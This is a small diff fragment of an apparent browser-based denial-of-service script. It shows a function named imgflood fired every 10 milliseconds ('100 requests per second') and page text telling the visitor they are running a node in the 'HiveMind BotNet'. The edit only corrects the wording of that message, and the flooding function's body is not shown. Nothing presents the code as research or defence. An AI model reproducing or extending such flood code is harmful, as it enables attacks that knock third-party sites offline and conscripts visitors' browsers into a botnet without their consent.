@@ -20,5 +20,5 @@ function imgflood() {
 }
 setInterval(imgflood, 10) //100 requests per second
 
-document.write("You currently a Node in the HiveMind BotNet...");
+document.write("You currently running a Node in the HiveMind BotNet...");
 document.write("Running...");
